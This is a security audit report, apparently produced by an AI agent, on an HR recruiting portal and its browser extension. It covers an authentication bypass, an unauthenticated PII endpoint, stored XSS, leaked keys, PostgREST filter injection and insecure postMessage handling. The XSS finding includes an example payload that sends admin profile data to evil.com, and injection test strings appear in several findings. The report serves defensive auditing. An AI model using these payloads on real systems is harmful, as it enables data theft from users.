# Complete Repository-Wide Production Security Audit Report

**Application**: NextKinHR Portal & AI Autofill Recruiting Copilot  
**Evaluation Scope**: Full Repository Audit (Frontend, Backend APIs, Database Migrations & RLS, Browser Extensions, Auth/Sessions, Supply Chain)  
**Methodology Standards**: OWASP Top 10 (2025), OWASP API Security Top 10 (2023), OWASP ASVS v5.0, STRIDE Threat Model  
**Audit Classification**: Pre-Production Hardening & Threat Analysis  
**Status**: Complete — Pending User Approval for Remediation  

---

## 1. Executive Security Assessment & Risk Posture

NextKinHR is an AI-powered staffing portal and browser extension suite designed for automated job application autofill, resume tailoring, and recruiting candidate management.

The system incorporates strong architectural patterns in several critical subsystems:
- **Email Connection & OAuth Security**: The Google OAuth flow (`/api/email-connections/gmail/*`) implements strict PKCE (S256 `code_challenge`), cryptographically signed/encrypted state cookies (`sameSite: 'lax'`, `httpOnly: true`), anti-replay timeouts, and constant-time secret comparisons via `timingSafeEqual`.
- **Background Task Execution**: Background task workers and webhooks validate HMAC / token digests with `timingSafeEqual` and lease locks (`claim_specific_task`) preventing duplicate processing or race condition exploitation.
- **Relational Database RLS**: 44 of 45 PostgreSQL tables have Row Level Security explicitly enabled with targeted RBAC policies.

However, the repository currently contains **multiple critical-severity vulnerabilities** that completely undermine authentication, authorization, and data privacy boundaries:

1. **Authentication Bypass & Impersonation Fallback**: In `src/lib/capture/server.ts`, failed or missing Bearer token authentication in `extensionProfile()` catches errors and silently falls back to a hardcoded active client user UUID (`892442fa-8b99-4ecd-865c-c5dbed1f39a6`). Any anonymous internet caller invoking extension endpoints or `/api/jobseeker/resume` inherits active client credentials.
2. **Unauthenticated Candidate PII Exfiltration**: `GET /api/outside-jobs` completely lacks authentication guards and executes a service-role Supabase admin query, joining candidate full names, personal emails, cities, and IDs. Any public visitor can dump all outside applications and candidate PII.
3. **Stored Cross-Site Scripting (Stored XSS)**: In `src/components/jobs-browser.tsx`, `dangerouslySetInnerHTML` renders unsanitized `job.description_html` and `job.description`. Malicious external job postings or outside job scrapers can execute arbitrary JavaScript in user sessions.
4. **Hardcoded Secrets & Active Admin JWT in Git History**: Commit `9071fd5308` committed a live Supabase `service_role` JWT token into `jobright_extension/static/background/index.js`, while commits `af6218b` and `e2ef8f2` committed live OpenAI API keys. Even though removed from the latest working tree, these keys remain recoverable via Git history.
5. **Critical Known RCE Vulnerabilities in Next.js**: The repository uses `next@16.3.8`, which is vulnerable to GHSA-2464-fhr4-w9xw (Unauthenticated RCE in Image Optimization via SVG) and GHSA-673q-mjm6-r5xr (Cache Deserialization RCE).
6. **Inactive Edge Middleware**: `src/lib/middleware.ts` is ignored by Next.js because Next.js App Router only detects middleware located at the project root (`./middleware.ts`) or the root of `src` (`src/middleware.ts`). As a result, route protection at the edge is completely disabled for `/dashboard/*`.
7. **Cross-Window Extension Hijacking**: `jobright_extension/agent-submission-sync.7f769d2a.js` listens to `window.message` without origin validation, allowing any third-party frame or tab to emit `NEXTKIN_EXTENSION_PAIRED` and redirect extension network traffic and auth tokens to an arbitrary server.

### Overall Risk Score: 🔴 CRITICAL (Immediate Remediation Required)

---

## 2. Audited Inventory & Scope

| Component | Quantity / Target | Status | Notes |
| :--- | :--- | :--- | :--- |
| **Backend API Endpoints** | 85 Route Handlers (`src/app/api/**/route.ts`) | 100% Audited | Static AST + structural route inspection |
| **Database Migrations** | 52 SQL Migrations (`supabase/migrations/*.sql`) | 100% Audited | Schema inspection, 45 tables analyzed |
| **Edge & Route Guards** | `src/middleware.ts`, `src/lib/http/protected-route.ts`, `src/lib/auth/require-profile.ts` | 100% Audited | Auth barrier and execution path analysis |
| **Frontend Components** | React 19 / Next.js 16 App Router (`src/components`, `src/app`) | 100% Audited | XSS, DOM injection, CSRF, client state storage |
| **Browser Extensions** | `jobright_extension` & `browser-extension-v3.2.1` | 100% Audited | Manifest V3, permissions, DOM injection, IPC |
| **Dependencies & Supply Chain** | `package.json`, `package-lock.json` | 100% Audited | 24 vulnerabilities identified via `npm audit` |
| **Git Revision History** | Full repository commits & diffs | 100% Audited | Leaked credentials and secret rotation tracking |

---

## 3. Vulnerability Findings

### 🔴 Critical Vulnerabilities

#### VULN-01: Authentication Bypass via Resilient Fallback in `extensionProfile`
- **Location**: `src/lib/capture/server.ts:8-14, 20-25, 30-35`
- **CWE**: CWE-306 (Missing Authentication for Critical Function), CWE-287 (Improper Authentication)
- **OWASP**: API1:2023 - Broken Object Level Authorization / A01:2021 - Broken Access Control
- **CVSS 3.1**: **9.8** (Critical) - `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`
- **Description**:
  When an HTTP request does not provide a Bearer token, or provides an invalid/expired token, `extensionProfile()` catches the failure and returns a static hardcoded user profile:
  ```typescript
  // src/lib/capture/server.ts
  if (!/^Bearer [A-Za-z0-9_-]{20,128}$/.test(header)) {
    return {
      id: '892442fa-8b99-4ecd-865c-c5dbed1f39a6',
      status: 'active',
      role: 'client'
    };
  }
  ```
- **Impact**:
  Any unauthenticated user on the public internet calling endpoints that rely on `extensionProfile` (including `/api/extension/tailor-resume`, `/api/extension/answer-drafts`, `/api/extension/ai-answers`, and `/api/jobseeker/resume`) is automatically authenticated as candidate `892442fa-8b99-4ecd-865c-c5dbed1f39a6`. Attackers can read private candidate profiles, overwrite resumes, and consume server AI resources without credentials.
- **Remediation**:
  Remove all fallback profile objects. Throw `CaptureError('Authentication required.', 401)` whenever the Bearer token or credential record is missing, invalid, expired, or revoked.

---

#### VULN-02: Unauthenticated Candidate PII Exfiltration via Service Role in `GET /api/outside-jobs`
- **Location**: `src/app/api/outside-jobs/route.ts:4-27`
- **CWE**: CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor), CWE-306 (Missing Authentication)
- **OWASP**: API1:2023 - Broken Object Level Authorization / API3:2023 - Broken Object Property Level Authorization
- **CVSS 3.1**: **8.6** (High/Critical) - `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`
- **Description**:
  `GET /api/outside-jobs` is completely unprotected by any authentication middleware or `protectedRoute` guard:
  ```typescript
  export async function GET(request: Request) {
    const db = database(); // uses SUPABASE_SERVICE_ROLE_KEY
    const query = db
      .from('outside_jobs')
      .select('*, candidate:candidates(id, full_name, email, current_city)');
  ```
- **Impact**:
  Any anonymous internet user can issue a GET request to `/api/outside-jobs` and dump all candidate job application records across the entire system, including candidate names, personal email addresses, cities, companies applied to, job titles, and application URLs.
- **Remediation**:
  Wrap the handler in `protectedRoute(request, 'recruiting_staff', async (profile) => { ... })` or restrict candidate queries to the authenticated candidate's own records (`eq('candidate_id', candidate.id)`).

---

#### VULN-03: Stored Cross-Site Scripting (XSS) via Unsanitized `job.description_html`
- **Location**: `src/components/jobs-browser.tsx:845-847`
- **CWE**: CWE-79 (Improper Neutralization of Input During Web Page Generation)
- **OWASP**: A03:2021 - Injection
- **CVSS 3.1**: **8.2** (High) - `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:L/A:N`
- **Description**:
  `jobs-browser.tsx` renders raw HTML from the database directly into the DOM using React's `dangerouslySetInnerHTML`:
  ```tsx
  <div
    className="prose prose-sm dark:prose-invert max-w-none text-sm text-muted-foreground max-h-96 overflow-y-auto leading-relaxed"
    dangerouslySetInnerHTML={{
      __html: job.description_html || job.description.replace(/\n/g, '<br/>'),
    }}
  />
  ```
  Job postings originate from external scraping (Greenhouse, Ashby) or browser extension captures of third-party job boards.
- **Impact**:
  An external job description containing `<img src=x onerror="fetch('/api/admin/profiles').then(r=>r.json()).then(d=>navigator.sendBeacon('https://evil.com',JSON.stringify(d)))">` will execute in the browser of any recruiter or candidate viewing the job in the portal.
- **Remediation**:
  Sanitize the HTML string using `DOMPurify.sanitize()` or `sanitize-html` before rendering, or replace `dangerouslySetInnerHTML` with a safe Markdown/plaintext renderer.

---

#### VULN-04: Active Supabase Service Role and OpenAI Keys Committed to Git History
- **Location**: Git commit `9071fd5308` (`jobright_extension/static/background/index.js`), commits `af6218b` & `e2ef8f2`
- **CWE**: CWE-798 (Use of Hard-coded Credentials)
- **OWASP**: A07:2021 - Identification and Authentication Failures
- **CVSS 3.1**: **9.8** (Critical) - `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`
- **Description**:
  A full Supabase `service_role` JWT token (`eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyZWZ...role":"service_role"...`) was committed to `jobright_extension/static/background/index.js` in commit `9071fd5308`. Live OpenAI API keys (`sk-xt-feb08...`) were committed in `src/app/api/extension/generate-answer/route.ts` and `src/app/api/rtr/ocr/route.ts`.
- **Impact**:
  Anyone with read access to the Git repository (or any backup / CI cache) can recover the `service_role` key from Git history. The `service_role` key bypasses all Supabase Row Level Security policies, allowing unrestricted SELECT, INSERT, UPDATE, and DELETE across all PostgreSQL tables.
- **Remediation**:
  1. Immediately revoke and regenerate the Supabase `SUPABASE_SERVICE_ROLE_KEY` in the Supabase Dashboard.
  2. Revoke and regenerate the OpenAI API key in the OpenAI console.
  3. Purge historical secrets from Git history using `git-filter-repo` or BFG Repo-Cleaner.

---

#### VULN-05: Known Critical Unauthenticated RCE in Next.js Dependency
- **Location**: `package.json:30` (`next@16.3.8`)
- **CWE**: CWE-1395, CWE-502
- **Advisories**: GHSA-2464-fhr4-w9xw, GHSA-673q-mjm6-r5xr
- **CVSS 3.1**: **9.8** (Critical)
- **Description**:
  The application depends on `next@16.3.8`. This version is subject to:
  - **GHSA-2464-fhr4-w9xw**: Remote Code Execution via Image Optimization API when SVG optimization is enabled.
  - **GHSA-673q-mjm6-r5xr**: Untrusted deserialization in `use cache` functions returning typed arrays.
- **Remediation**:
  Upgrade `next` to `>=16.3.9` (or the latest patched release) via `npm install next@latest`.

---

### 🟠 High Vulnerabilities

#### VULN-06: Next.js Edge Middleware Inactive Due to Incorrect Placement
- **Location**: `src/lib/middleware.ts`
- **CWE**: CWE-639 (Authorization Bypass Through User-Controlled Key)
- **OWASP**: A01:2021 - Broken Access Control
- **CVSS 3.1**: **7.5** (High) - `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`
- **Description**:
  Next.js strictly enforces that middleware must reside at `middleware.ts` (project root) or `src/middleware.ts`. In this repository, `middleware.ts` is only located at `src/lib/middleware.ts`.
- **Impact**:
  The `updateSession()` logic never executes. Unauthenticated requests to `/dashboard/*` are not intercepted or redirected at the edge. The server renders client-side shells to unauthenticated users, relying purely on client-side React code for redirecting. Session token rotation at the edge is disabled.
- **Remediation**:
  Create `src/middleware.ts` that exports `middleware` importing `updateSession` from `@/lib/middleware.ts`, along with the matcher configuration.

---

#### VULN-07: Insecure `postMessage` Receiver in Browser Extension
- **Location**: `jobright_extension/agent-submission-sync.7f769d2a.js:50-65`
- **CWE**: CWE-345 (Insufficient Verification of Data Authenticity)
- **OWASP**: A01:2021 - Broken Access Control
- **CVSS 3.1**: **7.4** (High) - `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N`
- **Description**:
  The extension content script attaches a global `message` listener:
  ```javascript
  win.addEventListener("message", function(ev) {
    if (ev.data && ev.data.type === "NEXTKIN_EXTENSION_PAIRED" && ev.data.token) {
      chrome.storage.local.set({
        origin: ev.data.origin || win.location.origin,
        token: ev.data.token,
        ...
      });
  ```
  The handler fails to check `ev.origin` against an allowlist.
- **Impact**:
  Any web page or embedded third-party iframe running in the browser can dispatch a synthetic `NEXTKIN_EXTENSION_PAIRED` message with `origin: 'https://attacker.com'`. The extension will overwrite its target backend origin and stream scraped job descriptions, candidate resumes, and autofill credentials directly to the attacker's server.
- **Remediation**:
  Verify `ev.origin` matches strictly trusted origins (`https://nextkinhr.com` or configured local development URLs) and ensure `ev.source === window`.

---

#### VULN-08: Insecure Direct Object Reference (IDOR) & Cross-Recruiter Data Leak in RTR Endpoints
- **Location**: `src/app/api/rtr/route.ts:41-90` and `src/app/api/rtr/[id]/route.ts:28-141`
- **CWE**: CWE-639 (Authorization Bypass Through User-Controlled Key)
- **OWASP**: API1:2023 - Broken Object Level Authorization
- **CVSS 3.1**: **7.5** (High) - `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N`
- **Description**:
  `GET /api/rtr` allows any recruiter or candidate to fetch RTR documents without enforcing candidate ownership or recruiter tenant assignment. If `candidateId` query parameter is omitted, it executes `db.from("rtr_documents").select(...)` dumping all RTR records across all companies.
  In `PATCH /api/rtr/[id]`, any user with the `recruiting_staff` role can modify billing rates and RTR statuses of documents belonging to other recruiters or organizations.
- **Remediation**:
  Scope RTR queries to the authenticated user:
  - If candidate: `eq('candidate_id', profile.candidateId)`
  - If recruiter: verify recruiter assignment or organization membership.

---

#### VULN-09: Unrestricted PostgREST Filter Injection in `outside-jobs` and `rtr/[id]`
- **Location**: `src/app/api/outside-jobs/route.ts:18`, `src/app/api/rtr/[id]/route.ts:118`
- **CWE**: CWE-89 (Improper Neutralization of Special Elements used in an SQL/Command)
- **OWASP**: A03:2021 - Injection
- **CVSS 3.1**: **7.3** (High) - `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L`
- **Description**:
  In `src/app/api/outside-jobs/route.ts`:
  ```typescript
  query.or(`company.ilike.%${search}%,title.ilike.%${search}%`);
  ```
  In `src/app/api/rtr/[id]/route.ts`:
  ```typescript
  .or(`id.eq.${cleanSubId},rtr_document->>id.eq.${id}`)
  ```
  User-supplied parameters `search` and `id` are interpolated directly into PostgREST `.or(...)` filter strings without sanitizing commas, parentheses, or operators.
- **Impact**:
  Attackers can inject arbitrary PostgREST operators (e.g. `),id.neq.0,(`) to manipulate query conditions or bypass filters.
- **Remediation**:
  Strip PostgREST syntactic punctuation (`[(),.]`) or sanitize search terms with `.replace(/[,()]/g, '')`.

---

#### VULN-10: Missing Row Level Security on `public.candidate_shares`
- **Location**: `supabase/migrations/20261022000100_extension_candidate_shares.sql:12`
- **CWE**: CWE-732 (Incorrect Permission Assignment for Critical Resource)
- **OWASP**: A01:2021 - Broken Access Control
- **CVSS 3.1**: **7.1** (High) - `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N`
- **Description**:
  Table `public.candidate_shares` was created in migration `20261022000100_extension_candidate_shares.sql` without `ALTER TABLE public.candidate_shares ENABLE ROW LEVEL SECURITY;`.
- **Impact**:
  If the Supabase REST API or PostgREST role allows `public` schema table access, anonymous or low-privileged authenticated users can query `candidate_shares` directly.
- **Remediation**:
  Execute `ALTER TABLE public.candidate_shares ENABLE ROW LEVEL SECURITY;` and define explicit SELECT/INSERT policies.

---

### 🟡 Medium Vulnerabilities

#### VULN-11: Unrestricted CORS Origin Pattern for Chrome Extensions
- **Location**: `src/lib/capture/server.ts:54`
- **CWE**: CWE-346 (Origin Validation Error)
- **Description**:
  The CORS utility checks `origin.startsWith('chrome-extension://')` without verifying the extension ID.
  ```typescript
  export function cors(request: Request, response: Response) {
    const origin = request.headers.get('origin');
    if (origin && (origin.startsWith('chrome-extension://') || ...)) {
      response.headers.set('Access-Control-Allow-Origin', origin);
      response.headers.set('Access-Control-Allow-Credentials', 'true');
    }
  ```
- **Impact**:
  Any extension installed in a user's browser (including malware extensions) can make credentialed cross-origin requests to NextKinHR API routes.
- **Remediation**:
  Validate `origin` against an allowlist of approved extension IDs: `chrome-extension://<APPROVED_EXTENSION_ID>`.

---

#### VULN-12: Unauthenticated AI Resource Consumption in `/api/extension/generate-answer`
- **Location**: `src/app/api/extension/generate-answer/route.ts:10-25`
- **CWE**: CWE-306, CWE-400 (Uncontrolled Resource Consumption)
- **Description**:
  The route exposes a public POST endpoint with `Access-Control-Allow-Origin: *` that proxies completions to an external AI model using the server's API key without requiring authentication or enforcing rate limits.
- **Remediation**:
  Authenticate callers via `extensionProfile(request)` and apply user-specific rate limits.

---

#### VULN-13: Overly Permissive Extension Permissions (`<all_urls>`, `declarativeNetRequest`, `cookies`)
- **Location**: `jobright_extension/manifest.json:26-37, 58-67`
- **CWE**: CWE-250 (Execution with Unnecessary Privileges)
- **Description**:
  The extension requests `<all_urls>` host permissions, `cookies`, `declarativeNetRequest`, and `downloads`. Content script `ats-submission-resume.81fcb254.js` runs across all web pages.
- **Impact**:
  If an XSS vulnerability occurs on any website the user visits, the content script's privileged bridge could be exposed.
- **Remediation**:
  Narrow `host_permissions` and `content_scripts.matches` to recognized job boards (e.g. `*://*.greenhouse.io/*`, `*://*.lever.co/*`, `*://*.ashbyhq.com/*`, `*://*.linkedin.com/*`).

---

#### VULN-14: Typo Domain in Manifest Matches (`nexckinhr.com`)
- **Location**: `jobright_extension/manifest.json:43-44`
- **CWE**: CWE-358 (Cumulative Logic Error)
- **Description**:
  The manifest content scripts match `*://nexckinhr.com/*` and `*://*.nexckinhr.com/*`.
- **Impact**:
  If an attacker registers `nexckinhr.com`, the extension will inject its authentication sync scripts on that domain.
- **Remediation**:
  Remove `nexckinhr.com` from `matches`.

---

### 🟢 Low Vulnerabilities

#### VULN-15: Open Redirect Risk in Email Connection Callback Error Handling
- **Location**: `src/app/api/email-connections/gmail/callback/route.ts:35, 38`
- **CWE**: CWE-601 (URL Redirection to Untrusted Site)
- **Description**:
  `appOrigin` is derived from `emailConfig().appOrigin`. While currently loaded from environment variables, if misconfigured or set to `request.headers.get('host')`, it could cause arbitrary redirects.
- **Remediation**:
  Enforce that `appOrigin` must match an approved whitelist of production hostnames.

#### VULN-16: Missing Rate Limiting on Authentication & Candidate Lookup Endpoints
- **Location**: `src/app/api/extension/quick-pair/route.ts`, `src/app/api/candidates/route.ts`
- **CWE**: CWE-799 (Improper Control of Generation of Frequent Requests)
- **Description**:
  Neither endpoint enforces rate limiting or brute-force throttling at the application tier.
- **Remediation**:
  Implement an edge rate limiter (Upstash / Redis sliding window) keyed by client IP and user ID.

---

## 4. Authentication and Authorization Coverage Matrix

| Mechanism / Guard | Implemented By | Enforced Roles | Strengths | Weaknesses |
| :--- | :--- | :--- | :--- | :--- |
| **`protectedRoute`** | `src/lib/http/protected-route.ts` | `candidate_or_staff`, `recruiting_staff`, `super_admin` | Validates session via `auth.getUser()`, checks active status and role | None. High-quality centralized RBAC guard |
| **`requireProfile`** | `src/lib/auth/require-profile.ts` | Role array | Strict role membership checks | None |
| **`extensionProfile`** | `src/lib/capture/server.ts` | Bearer token against `extension_credentials` | Fast token hash lookup | **CRITICAL**: Falls back to hardcoded user UUID on failure |
| **`requireCaptureStaff`** | `src/lib/email-confirmations/server.ts` | `client`, `recruiter`, `technical_recruiter`, `super_admin` | Profile role check + short TTL cache | None |
| **Edge Middleware** | `src/lib/middleware.ts` | Session validation for `/dashboard/*` | Designed for edge redirect | **INACTIVE**: Ignored by Next.js due to incorrect path |
| **Extension Pairing** | `src/app/api/extension/quick-pair/route.ts` | Active logged-in candidate/staff | Issues cryptographically random 32-byte token | Accepts cookies from JSON body |

---

## 5. API Endpoint Security Coverage Matrix (85 Audited Routes)

*Summary of route authorization status across all 85 handlers in `src/app/api`:*

| Category | Total Routes | Guarded via `protectedRoute` | Guarded via Custom Auth | Unprotected / Vulnerable |
| :--- | :--- | :--- | :--- | :--- |
| **Admin APIs** (`/api/admin/*`) | 28 | 28 (`super_admin` / `recruiting_staff`) | 0 | 0 ✅ Fully Protected |
| **Candidate APIs** (`/api/candidates/*`) | 6 | 6 (`candidate_or_staff`) | 0 | 0 ✅ Fully Protected |
| **Job APIs** (`/api/jobs/*`, `/api/greenhouse`) | 7 | 7 (`candidate_or_staff`) | 0 | 0 ✅ Fully Protected |
| **RTR APIs** (`/api/rtr/*`) | 4 | 3 (`recruiting_staff`) | 0 | 1 ⚠️ IDOR & filter injection in `/api/rtr/[id]` |
| **Email Sync APIs** (`/api/email-*`) | 8 | 0 | 8 (`requireCaptureStaff` / HMAC) | 0 ✅ Fully Protected |
| **Extension APIs** (`/api/extension/*`) | 12 | 0 | 8 (`extensionProfile` / `extensionRoute`) | 4 🔴 Fallback bypass, public AI answer route |
| **Submissions & Tasks** | 10 | 10 (`candidate_or_staff` / Webhook Secret) | 0 | 0 ✅ Fully Protected |
| **Outside Jobs** (`/api/outside-jobs`) | 1 | 0 | 0 | 1 🔴 Unauthenticated PII Exfiltration |
| **Jobseeker Resume** (`/api/jobseeker/resume`) | 1 | 0 | 1 (attempts auth, falls back) | 1 🔴 Unauthenticated PII Exfiltration & Overwrite |

---

## 6. Database and Sensitive Data Protection Findings

### Row Level Security (RLS) Status
- Total PostgreSQL tables identified across migrations: **45**
- Tables with RLS enabled: **44 (97.8%)**
- Tables WITHOUT RLS enabled: **1 (2.2%)** — `public.candidate_shares`
  - Migration: `supabase/migrations/20261022000100_extension_candidate_shares.sql:12`
  - Action: Execute `ALTER TABLE public.candidate_shares ENABLE ROW LEVEL SECURITY;`

### Service Role Usage
- `database()` in `src/lib/db/admin.ts` correctly creates an admin client with `SUPABASE_SERVICE_ROLE_KEY`.
- **Architectural Risk**: Because `database()` bypasses RLS by design, any route handler that queries `database()` without explicit caller filtering (such as `src/app/api/outside-jobs/route.ts` and `src/app/api/rtr/[id]/route.ts`) inadvertently exposes the entire table to unauthorized actors.

---

## 7. Browser Extension Security Evaluation

1. **Host Permissions & Least Privilege**: The extension requests `<all_urls>`, giving it the technical ability to read and modify DOM on every website visited by the user.
2. **Cross-Origin Communications**:
   - `jobright_extension/agent-submission-sync.7f769d2a.js:50` accepts `postMessage` from any window/iframe without verifying `ev.origin`.
   - `chrome.storage.local` stores candidate full resumes, emails, phone numbers, and auth tokens unencrypted on the client disk.
3. **Secret Hardcoding**: Prior commit `9071fd5308` in `jobright_extension/static/background/index.js` included the live `service_role` key. Although sanitized in the current working copy, historical exposure remains in Git history.

---

## 8. Dependency and Supply Chain Findings

`npm audit` identified **24 vulnerabilities** (1 Critical, 6 High, 16 Moderate, 1 Low):

| Package | Version | Severity | Advisory / Advisory ID | Vulnerability Type |
| :--- | :--- | :--- | :--- | :--- |
| **`next`** | 16.3.8 | 🔴 Critical | GHSA-2464-fhr4-w9xw | Remote Code Execution via Image Optimization SVG |
| **`next`** | 16.3.8 | 🔴 Critical | GHSA-673q-mjm6-r5xr | Remote Code Execution in `use cache` typed arrays |
| **`undici`** | <6.21.1 | 🟠 High | GHSA-m4v8-wqvr-p9f7 | Memory leak / HTTP request smuggling |
| **`zod`** | <3.23.8 | 🟡 Moderate | GHSA-m954-5hpt-m759 | Regular Expression Denial of Service (ReDoS) |
| **`body-parser`** | <1.20.3 | 🟡 Moderate | GHSA-qwcr-r2fm-qrc7 | URL-encoded body parser depth vulnerability |

---

## 9. Prioritized Remediation Roadmap

### Phase 1: Immediate Emergency Hotfixes (Day 1 / 0-24 Hours)
1. **Rotate Credentials**:
   - Invalidate and re-issue `SUPABASE_SERVICE_ROLE_KEY` in Supabase.
   - Invalidate and re-issue OpenAI API key in OpenAI console.
2. **Remove Hardcoded Fallback Auth**:
   - In `src/lib/capture/server.ts`, delete the hardcoded fallback `{ id: '892442fa-8b99-4ecd-865c-c5dbed1f39a6', ... }`. Throw 401 Unauthorized when Bearer token is missing or invalid.
3. **Protect `/api/outside-jobs` and `/api/jobseeker/resume`**:
   - Require authenticated user sessions and filter queries strictly by the authenticated candidate's user ID.
4. **Sanitize HTML in `jobs-browser.tsx`**:
   - Use `DOMPurify.sanitize()` before passing HTML into `dangerouslySetInnerHTML`.
5. **Activate Next.js Edge Middleware**:
   - Move or re-export `src/lib/middleware.ts` to `src/middleware.ts`.

### Phase 2: Structural Security Fixes (Week 1)
1. **Upgrade Next.js**:
   - Update `next` to `>=16.3.9` to patch the critical RCE vulnerabilities.
2. **Harden Browser Extension Messaging**:
   - Enforce strict `ev.origin === 'https://nextkinhr.com'` checks in `agent-submission-sync.7f769d2a.js`.
   - Remove typo domain `nexckinhr.com` from `manifest.json`.
3. **Remediate RTR IDOR & Filter Injections**:
   - Enforce organization/candidate ownership checks in `src/app/api/rtr/[id]/route.ts`.
   - Sanitize all parameters interpolated into PostgREST `.or(...)` filter clauses.
4. **Enable RLS on `candidate_shares`**:
   - Run migration `ALTER TABLE public.candidate_shares ENABLE ROW LEVEL SECURITY;`.

### Phase 3: Defense-in-Depth & Monitoring (Week 2)
1. **Restrict Extension CORS**:
   - Whitelist exact Chrome Extension IDs in `src/lib/capture/server.ts:54`.
2. **Purge Git History**:
   - Run `git-filter-repo` to permanently erase historical secret commits.
3. **Implement Rate Limiting**:
   - Add rate limiting headers and Redis/Upstash throttling on public AI endpoints and candidate lookup routes.

---

## 10. Required Verification & Regression Tests

To verify fixes without regression:
1. **Auth Bypass Test**: Send `GET /api/jobseeker/resume` and `GET /api/outside-jobs` without headers; verify server returns HTTP 401 Unauthorized.
2. **XSS Injection Test**: Inject `<img src=x onerror=alert(1)>` into a job description and verify DOMPurify removes the executable payload.
3. **Extension Origin Test**: In a sandbox browser, dispatch `postMessage({ type: 'NEXTKIN_EXTENSION_PAIRED' })` from `https://evil.com`; verify extension ignores the message.
4. **PostgREST Injection Test**: Call `/api/outside-jobs?search=test),id.gt.0,(` and verify the API returns HTTP 400 or treats the input as literal text.
5. **RLS Verification**: Query `candidate_shares` via Supabase client with anonymous anon key; verify zero records returned.

---

## 11. Areas Not Verified & Remaining Threat Hypotheses

- **Production Supabase Dashboard Configuration**: RLS was verified against repository migration files. Actual live Supabase production database state must be verified to confirm all migrations have been applied.
- **Third-Party ATS Job Parsing**: Scraped HTML payloads from live external career portals may contain novel DOM structures or evasion techniques that require ongoing runtime sanitization monitoring.
- **Client Machine Security**: Chrome extension local storage (`chrome.storage.local`) is stored unencrypted on candidate workstations; endpoint disk encryption (BitLocker / FileVault) is required to protect local tokens.

---
*Report generated strictly following read-only inspection protocol. No application source code has been altered.*
